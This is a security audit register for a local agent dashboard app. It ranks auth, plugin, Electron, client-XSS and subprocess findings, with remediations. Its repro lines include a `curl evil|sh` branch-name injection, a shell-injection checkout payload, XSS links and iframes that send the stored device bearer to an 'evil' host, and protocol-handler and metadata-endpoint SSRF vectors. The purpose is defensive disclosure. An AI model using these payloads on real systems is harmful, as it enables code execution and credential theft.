# Audit Findings Register

Status legend: 🔴 High · 🟠 Medium · 🟡 Low · 🔵 Info/verify · ✅ Control confirmed adequate

Each finding: `[SEV] [STRIDE] boundary — file:line`
> exploit sketch · existing control · gap · suggested remediation

---

## Cluster A — Core auth / trust boundary
_server: localhost-guard, local-token, auth-plugin, bearer-auth, pairing, paired-devices, ws-ticket, cors-origin, tunnel-core, model-proxy, oauth-callback-server_

**Posture: strong.** Code-exec routes (terminal/session/git/WS) consistently gated; secrets CSPRNG-generated, constant-time compared, stored hashed at `0600`; XFF-spoofing closed by `trustProxy:false` + header-presence checks.

- `🟠[E,I] provider-auth surface ungated when OAuth off — routes/provider-auth-routes.ts:88, server.ts:1356-1359`
  > OAuth `onRequest` gate registers only when `authConfig` set (server.ts:988); these routes carry **no `networkGuard` preHandler**. LAN/tunnel caller (auth off) can read masked keys, delete/overwrite provider creds, spam `authorize` (browser-spawn DoS). · Fix: attach `{preHandler: networkGuard}` to provider-auth + models-introspection routes.
- `🟠[S,E] bare-loopback trusted under marker-less tunnel — localhost-guard.ts:50`
  > `ssh -R`/socat reverse tunnel terminating on loopback WITHOUT forwarding headers ⇒ `isGenuinelyLocal`=true ⇒ unauth code-exec. zrok DOES inject headers (safe). · Fix: require local-token for terminal/session/git rather than trusting bare loopback; document only header-injecting tunnels are safe.
- `🟠[S,T] login OAuth CSRF + open redirect — auth-plugin.ts:60,214`
  > `decodeState` never validates nonce, no state cookie ⇒ no CSRF/code-injection protection; `returnUrl` unchecked into `reply.redirect` ⇒ open redirect. · Fix: bind state nonce to short-lived signed cookie; constrain `returnUrl` to same-origin relative.
- `🟡[I] session cookie Secure flag off behind TLS tunnel — auth-plugin.ts:206`
  > `secure: request.protocol==="https"` but `trustProxy` unset ⇒ local http hop ⇒ cookie set WITHOUT Secure behind zrok TLS. · Fix: set secure when tunnel/https active.
- `🟡[T] JWT alg not pinned — auth.ts:157` · not exploitable (HMAC secret) but add `{algorithms:["HS256"]}`.
- `🟡[T,I] HMAC secret only 128-bit — auth.ts:135` · use 32 bytes; verify CONFIG_FILE 0600.
- `🟡[R] no auth audit trail — pairing.ts:229, paired-devices.ts:120, provider-auth-routes.ts:239` · log approve/revoke/credential-write (device id, action, IP, ts).
- `🟡[I,E] broad CORS: *.share.zrok.io + pi-dashboard.dev — cors-origin.ts:61,64` · fragile if sameSite ever→none; narrow zrok wildcard to active tunnel host.
- `🔵 verify` CONFIG_FILE 0600 (config writer, out of scope); tunnel-URL origin normalization (cors-origin.ts:59).
- ✅ **Confirmed adequate:** XFF spoof defeated (trustProxy false); all tokens CSPRNG 32B + PKCE S256 + Ed25519 identity; timing-safe compares everywhere; secret files 0600; bearer stored hashed only; WS ticket single-use scope-bound no-TOCTOU + durable-bearer-never-on-wire; `/v1/*` proxy gate uniform w/ FailedAuthBackoff; pairing brute-force bounded (128-bit code, 10 redeem / 5 approve attempts, ~60s TTL); `trustedNetworks:[]` default (no wide CIDR); opaque-origin CORS denied; provider tokens redacted in logs.

## Cluster B — Dangerous capabilities
_server: terminal-gateway/manager, browser-gateway, pi-gateway, process-manager, git-operations, path-containment, file-routes, session readers, directory-service_

**Posture: solid backbone (path-containment + scoped WS tickets + argv commit/grep), one exploitable legacy bug.**

- `🔴[T,E] command injection in git checkout — git-operations.ts:383,387,391`
  > `POST /api/git/checkout {branch:"main;curl evil|sh"}` → `run(\`git checkout ${branch}\`)` = `execSync` → `/bin/sh -c`. `branch` from request body, only non-empty-checked. `;` `|` `$()` backticks all execute. The SAFE argv pattern already exists in `commitFiles` in the SAME file. · Reachable by any authed device (incl. genuine-local). · Fix: route through `runGitCapture(["checkout",…argv])` (no shell) + branch allowlist `^[\w./-]+$` reject leading `-`.
- `🟠[T,E] shellEscape POSIX-only, Windows cmd.exe bypass — git-operations.ts:787 (used 641,643,913,1014,1027,1054)`
  > single-quote escape meaningless to cmd.exe (`& | ^ %` metachars) ⇒ Windows arg-injection on worktree/merge/PR via crafted ref. · Fix: replace all `execSync(args.map(shellEscape))` with spawn argv `shell:false`.
- `🟠[D] unbounded PTY spawn — terminal-manager.ts`
  > authed client loops `create_terminal`; each = 256KB ring + real shell, no cap ⇒ mem/PID exhaustion. · Fix: cap concurrent PTYs (global+per-cwd), reap idle.
- `🟠[I,E] unconstrained browse + mkdir-anywhere — routes/file-routes.ts (/api/browse, /browse/mkdir, /browse/flags)`
  > only `networkGuard`, NO containment (unlike `/api/file*`). `/api/browse?path=/` enumerates whole FS; `/browse/mkdir` creates dir at arbitrary parent. · Fix: constrain roots to $HOME + pinned dirs.
- `🟠[E,T] unauthenticated recovery server on all interfaces — recovery-server.ts`
  > `server.listen(port)` no host ⇒ 0.0.0.0; `POST /api/recovery/reinstall` runs `npm install -g` (lifecycle scripts), `/retry` respawns CLI. No auth. · Fix: bind loopback + gate POSTs on local-token.
- `🟡[I] absolute-path + git-stderr leak in error bodies — git-operations.ts, routes/git-routes.ts` · redact to relative on the wire.
- `🟡[T] terminal cwd unconstrained — browser-handlers/terminal-handler.ts` · validate `msg.cwd ∈ known∪pinned` (defense-in-depth; authed user already has RCE via prompts).
- `🔵 verify` pi-core-updater.ts:124 — confirm npm version/spec args are server-derived not request-controlled.
- ✅ **Confirmed adequate:** `lib/path-containment.ts` correct + universally applied (realpath both sides = symlink-safe, git widening fails closed, 2s timeout; EVERY reader calls it — file/tree/raw/render/exists, eml, office, grep backstop); `commitFiles`/worktree POSIX ops argv + `assertPathsInside` + `git commit -F -` stdin; WS upgrade `validateWsUpgrade` scope-bound single-use tickets (browser ticket can't open `/ws/terminal`); grep.ts execFile argv + `-e query --` + ReDoS cap; atomic md write realpath + O_EXCL (symlink-proof); package-manager-wrapper `shell:false`.

## Cluster C — Plugin route registrars
_automation-plugin, kb-plugin, flows-plugin, flows-anthropic-bridge-plugin, goal-plugin, roles-plugin, subagents-plugin, dashboard-plugin-runtime_

**Central finding: plugins mount on the guarded root Fastify (no separate-listener bypass), inherit the OAuth `onRequest` hook WHEN auth configured — but plugin routes NEVER receive the per-route `networkGuard` that shields core routes even with auth OFF.** So a no-auth zrok tunnel exposes plugin dangerous routes while equivalent core routes stay 403'd. This is the systemic hole (converges with Cluster A provider-auth finding).

- `🔴[E] tunnel → arbitrary automation write + agent spawn (RCE) — automation-plugin/src/server/routes.ts:197,235,313,85`
  > `POST /api/plugins/automation/create {scope:"folder", cwd:"/any", promptBody,…}` writes YAML+prompt to attacker `cwd` (`scopeBaseFor` returns cwd verbatim, no allowlist); `POST /run` spawns pi agent executing it = RCE. Reachable when auth off (no networkGuard). · Fix: thread `networkGuard` preHandler + cwd known-folders allowlist (like kb's `rejectCwd`).
- `🟠[I,T] arbitrary-path read via runId+cwd — automation-plugin/src/server/routes.ts:179`
  > `GET /result?cwd=/any&runId=../../…` reads `join(cwd,".pi/automation/runs",runId,"result.md")`; cwd unvalidated, runId unsanitized. `/list` `/definition` `/git-capable` similar. · Fix: networkGuard + cwd allowlist + reject runId with separators/`..`.
- `🟠[E] systemic: plugin routes omit networkGuard defense-in-depth`
  > every plugin registrar gets only `ctx.fastify`, never `networkGuard`; single point of failure = disabling/misconfiguring auth removes the only guard on plugin capabilities. · Fix: expose `networkGuard` on `ServerPluginContext` (or apply as auth-independent `onRequest`).
- `🟡[I] flows flow-inputs reads arbitrary flow file — flows-plugin/src/server/index.ts:63` · `cwd` defaults to `process.cwd()`, `flow` unsanitized. · Fix: cwd allowlist + reject separators + networkGuard.
- ✅ **kb-plugin** — `rejectCwd` canonicalizes (realpathSync) + admits only known folders/worktrees = real containment independent of auth; execFile fixed args. (Residual: reindex/config-write callable unauthed over no-auth tunnel but only against already-known folders — add networkGuard to fully close.)
- ✅ **goal-plugin** — HTTP endpoints live in CORE server (`registerGoalRoutes`) WITH `networkGuard` on every route; goal-plugin/src/server has NO routes and NO exec/spawn (reported "2 exec sites" not reproduced).
- ✅ **flows-anthropic-bridge** status-only route guarded; **subagents-plugin** adds only `onResponse` hook, no routes.

## Cluster D — Extension + bridge
_extension: bridge.ts, process-scanner, dev-build, vcs-info_

**Root cause for all High/Medium: the bridge↔server WebSocket has NO authentication in EITHER direction.** On localhost/LAN, any local process that occupies the port or wins mDNS inherits a full RCE-grade command channel into the agent. Exec/scan sinks themselves are well-built (numeric args, argv arrays). One fix (per-server shared secret on gateway handshake) closes the top four.

> **V2 re-scope:** the bridge gateway (`piPort`) is a SEPARATE listener bound to `config.host` and is NOT tunneled (only the HTTP `config.port` is shared). So these 🔴 are **same-host / LAN-only (if host widened)**, NOT internet-reachable. Real for the LAN threat model; urgency lowered from the initial "tunnel RCE" read.

- `🔴[S] server→bridge trust boundary unauthenticated — connection.ts:196, bridge.ts:703`
  > bridge opens `ws://localhost:${piPort}`, dispatches every frame by `msg.type` with no secret/token/origin check. Rogue local process binding piPort first (or winning health-check race) becomes "the server": sends `send_prompt`, `flow_management`, `role_set`. `sessionId` match is routing not auth. · Fix: mint per-server secret (have `config.secret`), require bridge to present it, server rejects unauthenticated gateway sockets; bind gateway to 127.0.0.1.
- `🔴[T,E] inbound command → shell exec — command-handler.ts:456→1040`
  > `send_prompt` text starting `!`/`!!` → `{type:bash}` → `pi.exec(bash,["-c",script])`. Chained with unauth channel = direct arbitrary RCE as agent user. · The exec sink is correctly built; the missing piece is authorization on the source. Closes with the same secret.
- `🟠[T] arbitrary internal event injection — bridge.ts:915`
  > `plugin_emit_event` does `pi.events.emit(anyString, data)` — fires any internal pi/plugin event bypassing typed handlers. · Fix: allowlist emittable event names.
- `🟠[S] mDNS discovery trust → connection redirect — bridge.ts:2526, server-auto-start.ts:89`
  > same-host malicious process advertises `_pi-dashboard._tcp` → `isLocalService`=true → bridge `updateUrl` to attacker WS. · Fix: keyed token in TXT record validated before updateUrl, or pin 127.0.0.1:piPort.
- `🟡[D] no rate limit on inbound commands / unbounded quiesceMs — bridge.ts:703,720, connection.ts:139` · clamp quiesceMs; token-bucket inbound bash/prompt.
- `🟡[I] git remote creds + bash output leave session over tunnel — vcs-info.ts:65, command-handler.ts:1048` · strip `userinfo@` from remote URLs; note bash output crosses tunnel.
- `🔵 verify` does zrok expose only HTTP client port, NOT the extension-gateway piPort? If piPort tunneled, the two 🔴 become REMOTELY reachable. (server-side, follow up)
- ✅ **Confirmed adequate:** process-scanner all `spawnSync` argv + numeric PIDs (no injection from scanned data); dev-build fixed command; bash wrapper resolved-abs-path + argv + env-escaped; reconnect backoff capped 30s + send buffer bounded 10k.

## Cluster E — Electron main / IPC
_electron: launch-source, doctor, dependency-detector, renderer html_

**webPreferences posture GOOD everywhere:** nodeIntegration:false + contextIsolation:true on every window; all renderer APIs via contextBridge; webSecurity never disabled. Risk concentrates in remote-mode.

- `🔴[E,S] untrusted remote renderer → privileged IPC — main.ts:394,416`
  > remote mode `loadURL(remoteUrl)` over plain http + shared `preload.js` exposing `window.remoteConnect`, `window.electron.doctor`, `window.piDashboard`. NO `event.senderFrame`/origin validation in any `ipcMain.handle`. MITM/malicious Docker host → `remoteConnect.connect(attacker)` (persistent redirect), `doctor.run()` (spawn local procs), `readServerLog()` (exfil), `probeServer()` (SSRF). · Fix: minimal preload for main window (not connect/doctor/readServerLog); validate senderFrame.url origin in every handler; keep wizard bridges on wizard window only.
- `🔴[E] shell.openExternal no scheme allowlist — main.ts:401-403`
  > `setWindowOpenHandler` forwards ANY scheme to `shell.openExternal`; remote content `window.open("file:///…")` / `search-ms:`/`ms-msdt:` → OS handler RCE chains. Code comment wrongly assumes openExternal refuses non-web schemes. · Fix: allowlist http/https/mailto only.
- `🟠[E] will-navigate open-external same missing allowlist — main.ts:405-412` · `file://` link → openExternal; filter scheme in open-external branch.
- `🟠[I] SSRF + version oracle from untrusted renderer — main.ts:331-336, remote-probe.ts:31`
  > `probeServer` fetch `${url}/api/health` no host restriction, reachable from remote renderer → probe `169.254.169.254`/internal hosts. · Fix: restrict probe to trusted wizard window; deny RFC1918+link-local+loopback.
- `🟡[I] server.log tail to any renderer — main.ts:326-328` (fixed path, no traversal) · gate by senderFrame origin.
- `🟡[T] doctor.html renderSuggestion allows javascript: href — renderer/doctor.html:96` (currently static suggestions, not reachable) · allowlist http(s) href.
- `🟡[T] execSync interpolated path — dependency-detector.ts:91` (local-only) · use execFileSync argv (module already does at :153).
- `🔵 verify` Electron major ≥ 20 so sandbox default true (not explicitly set).
- ✅ **Confirmed adequate:** nodeIntegration off + contextIsolation on all windows; contextBridge only; `normalizeRemoteUrl` forces http(s); readServerLogTail fixed path; on-disk Node probe + health check avoid shell.

## Cluster F — Client / web
_client, client-utils, shell, web: XSS (MermaidBlock, previews), token storage, LLM-output rendering_

**Amplifier: paired-device bearer lives in `localStorage` (device-auth.ts:24), auto-attached to every `/api/*`. Any XSS in the dashboard origin exfiltrates it = full control-plane takeover. That's why injection sites are High.**

- `🔴[T,I] LLM markdown → XSS — MarkdownContent.tsx:7,~415,~423` **NOT sanitized**
  > `rehypeRaw` (raw HTML parsed) + `urlTransform=(v)=>v` (DISABLES scheme sanitizer). `[x](javascript:fetch('//evil?t='+localStorage['pi-dashboard:device-bearer']))` or `<iframe srcdoc>` from LLM/tool output reaches DOM. · Fix: add `rehype-sanitize` (schema permitting KaTeX/pi-asset) after rehypeRaw; urlTransform allowlist http/https/mailto/pi-asset/data:image, drop javascript:/data:text/html.
- `🔴[T,I] attacker `.adoc` → XSS — preview/AsciiDocPreview.tsx:47 (server file-routes.ts:762)` **NOT sanitized**
  > asciidoctor `safe:"secure"` blocks includes/files but NOT inline HTML passthrough (`+++<img onerror>+++`); injected via dangerouslySetInnerHTML with no DOMPurify (the only doc renderer missing it). · Fix: DOMPurify the asciidoctor HTML server-side (mirror renderDocx) or disable passthrough. 🔵 verify passthrough reachable in asciidoctor 3.0.4 config.
- `🔴[I,E] auth bearer in localStorage — device-auth.ts:22,24,33`
  > durable REST bearer in JS-readable storage, auto-attached to `/api/*`+`/v1/*`; any XSS replays it → full compromise. · WS path IS hardened (single-use ticket, bearer never on socket). · Fix: prefer httpOnly SameSite cookie for REST where possible; else shorten TTL+rotate; add strict CSP (`script-src 'self'`) for cross-origin/tunnel case; closing the XSS trio is the real mitigation.
- `🟠[T,I] LLM mermaid → XSS — MermaidBlock.tsx:417 (sanitizer :72)` **partially sanitized (weak regex + mermaid strict mode)**
  > raw SVG injected; regex sanitizer strips only `<script>`/`on*=` — misses `<a xlink:href=javascript:>`, newline/unquoted handlers. Relies on mermaid `securityLevel:strict` as real defense. · Fix: DOMPurify with `USE_PROFILES:{svg:true,svgFilters:true}` instead of regex.
- ✅ **Confirmed adequate:** **DOCX** server DOMPurify `FORBID_TAGS:[script,style]` + mammoth hyperlinkGuard; **EML** double-defended (server DOMPurify + client `<iframe sandbox="" srcDoc>` opaque origin, headers escaped JSX, no remote fetch = no SSRF) — strongest surface; no tokens logged to console; `LAST_SERVER_KEY` is host:port not secret.

## Cluster G — Aux tools that exec
_nano-banana, document-converter, video-transcription, video-production, kb, image-fit, mockup-loop_

**Systemic strength: EVERY subprocess site uses argv arrays + `shell:false` (via shared `platform/exec.ts` or kb's execFileSync). Classic command injection structurally impossible across all 7 packages.** Residual = arg/option injection, SSRF, path/mount exposure, DoS.

- `🟠[E,I] agent path → writable docker bind-mount — document-converter/src/engine.ts:120-128,99-101`
  > runEngine walks every string field; any `/`-path gets `dirname` mounted `-v dir:dir` READ-WRITE. Hostile `{output:"/root/.ssh/authorized_keys"}` bind-mounts sensitive host dirs into engine container → read/overwrite. · Fix: `:ro` for inputs, confine mounts under a workspace root, reject `/etc`,`/root`,`~/.ssh`.
- `🟠[I,S] agent source URL → SSRF — kb/src/sources.ts:188,194`
  > `fetch(spec.ref)` no scheme/host validation; `http://169.254.169.254` SSRF. TOFU trust gate exists but no host filter once trusted. · Fix: https-only, block private/link-local after DNS resolve, cap redirects.
- `🟠[T,E] malicious archive → zip-slip extract — kb/src/sources.ts:191-192`
  > `unzip -o`/`tar xzf` on fetched archive; `../`/absolute entries write outside dest, overwrite host files. · Fix: reject `..`/absolute entries or traversal-safe extract lib.
- `🟠[D] MAX_AUDIO_MB parsed but never enforced — video-transcription/src/config.ts:19,90` · dead guard; add `statSync(src).size` check before extract/upload.
- `🟡[E] leading-dash filename → ffmpeg/ffprobe option injection — video-transcription/src/ffmpeg.ts:49,84,101; video-production/src/render.ts:127` · no `--` before positional paths; media named `-x` parsed as flag. Fix: insert `--` / `./`-prefix.
- `🟡[D] unbounded fetch body + no timeout — kb/src/sources.ts:188,194` · max-bytes cap + AbortSignal.timeout.
- `🟡[E] prompt/path leading-dash → nano-banana CLI flag injection — nano-banana/src/nano-banana.ts:62-68` · emit `--` before free-text/positional.
- ✅ **Confirmed adequate:** secrets never on argv/never logged (Soniox Bearer header, Gemini via env name-only, none hardcoded/ps-visible); image-fit bounded (maxBytes/maxEdge, no exec/fetch); mockup-loop "exec" is pure PATH scan not spawn; kb git resolver execFileSync argv + `--` before URL.

---

## Cross-cutting themes

**T1 — Auth/guard applied non-uniformly (the dominant systemic risk).** The per-route `networkGuard` and the OAuth `onRequest` hook do NOT cover: plugin routes (C), provider-auth + models-introspection routes (A), and the bridge↔server WS (D). OAuth hook is conditional (only when configured); default deployment (localhost, occasional tunnel) runs WITHOUT it, so plugin/provider-auth dangerous routes and the bridge command channel are exposed to LAN/tunnel. **Single highest-leverage fix: make the guard auth-independent + universal (core routes, plugin routes, WS gateways, bridge handshake).**

**T2 — Untrusted content → privileged sink.** LLM/document output → client XSS trio (F) → localStorage bearer. Agent-supplied paths → writable docker mounts / arbitrary browse (G, B). Remote Docker URL → privileged Electron preload (E). Recurring pattern: a trust boundary is crossed without re-validating the payload against the capability it reaches.

**T3 — What's already strong (audit confirms, don't touch):** path-containment (realpath both sides, universal), CSPRNG secrets + constant-time compares + 0600 files, scoped single-use WS tickets, argv+shell:false everywhere in aux tools, EML/DOCX sanitization, nodeIntegration-off/contextIsolation-on Electron, trustProxy:false XFF defense.

## Verification results (V1–V5)

- **V1 — CONFIRMED 🟠 (upgraded from Low):** `config.json` holds the auth HMAC secret (`ensureAuthSecret`) but is written with NO chmod — `config.ts:948` + `config-api.ts:183` are bare `writeFileSync` (umask-default perms, often `644` = other local users can read it). A local user reads the secret → forges session JWTs. Fix: chmod `0600` on config.json write (provider `auth.json` is already 0600; config.json is the gap).
- **V2 — RESOLVED ✅ (downgrades Cluster D blast radius):** the tunnel shares `config.port` (the HTTP client port, protected by networkGuard + ws-ticket). The bridge gateway is a SEPARATE `WebSocketServer` on `config.piPort` bound to `config.host` (`pi-gateway.ts:200`, `server.ts:1648`), and is NOT tunneled. So the D-🔴 unauthenticated-bridge findings are **same-host / LAN-only** (LAN only if `host` widened to 0.0.0.0), NOT internet-reachable over zrok. Still real for the LAN threat model, but re-scope D from "tunnel→RCE" to "local/same-host → RCE". S2 (bridge auth) remains warranted; urgency lowered.
- **V3 — RESOLVED ✅:** Electron `32.3.3` → sandbox defaults to true. The Electron `🔵 sandbox` verify clears; findings E-🔴 (preload/openExternal) stand independent of sandbox.
- **V4 — CONFIRMED 🔴:** asciidoctor `3.0.4`, factory default, `safe:"secure"`. Secure mode blocks includes/docinfo but does NOT strip inline/block passthrough (`+++<img onerror>+++`, `pass:[]`); no DOMPurify on the output → AsciiDoc XSS is real and reachable. S3 asciidoc fix stands.
- **V5 — CONFIRMED (triage):** `npm audit --omit=dev` = **20 vulns (2 critical, 3 high, 15 moderate)**. Actionable/reachable: **`xlsx` (high: prototype pollution + ReDoS, NO fix available)** — reachable via XLSX office-preview; consider sandboxing SheetJS parsing or pinning the vendor CDN build. Most others are transitive in build tooling (icon-gen/svg2png/request → uuid/yargs-parser) — lower reachability. **Postinstall scripts are first-party + benign:** `maybe-patch-package.cjs` runs patch-package only when a (unpublished) `patches/` dir exists; `fix-pty-permissions.cjs` only chmods the node-pty prebuild — no network, no untrusted exec. No supply-chain concern in own scripts.

_Register complete. Remediation ranked in `tasks.md`._

---

## Verified deep-dives (line-cited, own-eyes confirmation)

These three Highs were re-read end-to-end from the source (not just subagent report) and confirmed exploitable, with repro payloads.

### VD1 — git-checkout command injection 🔴 (B1) — CONFIRMED
Chain: `POST /api/git/checkout` (git-routes.ts:118, gate = `preHandler: networkGuard` line 120; validation = only `if(!cwd||!branch)` line 123) → `checkoutBranch(cwd,branch)` → `run(\`git checkout ${branch}\`, cwd)` (git-operations.ts:391; remote path 383 also injects `localName`+`branch`) → `run()` = `execSync(command)` (git-operations.ts:27) → `/bin/sh -c`.
- **Repro:** `POST /api/git/checkout {"cwd":"/tmp","branch":"x; id > /tmp/pwned #"}` → shell runs `id > /tmp/pwned`. (`cwd` only needs to be any existing dir; git failing is irrelevant — `;` chains regardless.)
- **Reach:** any authenticated caller — paired device over the tunnel (networkGuard passes on valid bearer) OR any same-host process (loopback). Sibling ops (1014/1027/1054) already `shellEscape`; checkout is the lone un-escaped legacy path. Fix is a 1-line switch to `runGitCapture(["checkout",…])`.

### VD2 — automation-plugin RCE 🔴 (C, tunnel-reachable when auth off) — CONFIRMED
Chain: `scopeBaseFor(scope,cwd)` (routes.ts:30) returns `cwd` VERBATIM for folder scope (no allowlist/containment). NONE of the automation routes carry `preHandler: networkGuard` (all bare `fastify.post/get`, routes.ts:85,197,…). `registerBearerAuth` onRequest only SETS `isAuthenticated` (never rejects); the rejecting OAuth onRequest is registered ONLY when auth configured. So with auth OFF (default) + no per-route networkGuard → a **tunneled** request reaches `/create` and `/run` ungated.
- **Repro:** `POST /api/plugins/automation/create {scope:"folder", cwd:"/any/writable", name, config:{trigger,action}, promptBody:"<agent instructions>"}` then `POST /api/plugins/automation/run {scope:"folder", cwd, name}` → writes prompt to attacker path + spawns a pi agent executing it = RCE.
- **Reach:** THIS is the genuine tunnel-facing RCE (contrast V2 which cleared the bridge). Core routes are shielded by per-route networkGuard even with auth off; plugin routes are not. Fix = S1 (thread networkGuard into plugin registrars + cwd allowlist).

### VD3 — markdown/LLM-output XSS 🔴 (F, S3) — CONFIRMED
`ReactMarkdown` config (MarkdownContent.tsx): `rehypePlugins=[rehypeRaw, rehypeKatex, …]` (415) parses embedded raw HTML; `urlTransform={(value)=>value}` (421) DISABLES the default scheme sanitizer (its own comment at 416 notes the default would sanitize); `a({href}) => href={href}` verbatim (503).
- **Live vectors:** (a) `[click](javascript:fetch('//evil?t='+localStorage['pi-dashboard:device-bearer']))` — anchor executes JS in-origin on click; (b) `<iframe srcdoc="<script>fetch('//evil?t='+localStorage['pi-dashboard:device-bearer'])</script>">` — rehypeRaw → real iframe; srcdoc inherits embedding origin → script runs in dashboard origin, exfiltrates the REST bearer → full `/api/*` takeover.
- **Not a vector:** string `<img onerror=…>` — React drops the event-handler prop (don't cite this one). Fix = S3 (rehype-sanitize + scheme-allowlist urlTransform; the localStorage bearer, VD-adjacent, is why any of these = total compromise).

### VD4 — Electron `shell.openExternal` no scheme allowlist 🔴 (B3) — CONFIRMED
`mainWindow.webContents.setWindowOpenHandler((details)=>{ void shell.openExternal(details.url); … })` (main.ts:401-403) forwards ANY scheme; `will-navigate` does the same (`shell.openExternal(url)` main.ts:410). No http(s) filter on either path.
- **Repro:** renderer (or MITM'd remote page) runs `window.open("ms-msdt:...")` / `window.open("file:///Applications/Calculator.app")` / `search-ms:` → handed to the OS protocol handler → known Windows protocol-handler RCE chains / arbitrary local app+file launch on macOS. Fix: allowlist http/https/mailto before openExternal on BOTH handlers.

### VD5 — Electron shared privileged preload on remote window 🔴 (B2) — CONFIRMED
Remote mode: `createMainWindow(remoteUrl)` (main.ts:524-528) → `loadURL(serverUrl=remoteUrl)` (416) with `webPreferences.preload = getMainPreloadPath()` (394). `preload.ts` side-effect-imports `doctor-preload` (9 → `window.electron.doctor`) + `remote-connect-preload` (12 → `window.remoteConnect`) and exposes `piDashboard` (65) — so untrusted remote content gets ALL THREE bridges. IPC handlers (main.ts:321-340) take `_event` and NEVER check `senderFrame`.
- **Repro:** a malicious/MITM'd remote (or Docker) server serves a page that calls `window.remoteConnect.connect(attackerUrl)` (persistent redirect/pin → relaunch), `window.piDashboard.readServerLog()` (local log exfil), `window.electron.doctor.run()` (spawn local detection processes), `window.piDashboard.probeServer("http://169.254.169.254/…")` (SSRF). Fix: minimal preload for the main window (drop connect/doctor/readServerLog), keep wizard bridges on the wizard window, validate `event.senderFrame.url` origin in every handler.

**Deep-dive status: all 7 confirmed Highs line-verified** — VD1 git-checkout, VD2 automation-RCE, VD3 markdown-XSS, VD4 openExternal, VD5 preload; asciidoc-XSS via V4; localStorage-bearer is a storage fact (device-auth.ts:24), the amplifier that makes every XSS = full `/api/*` takeover.
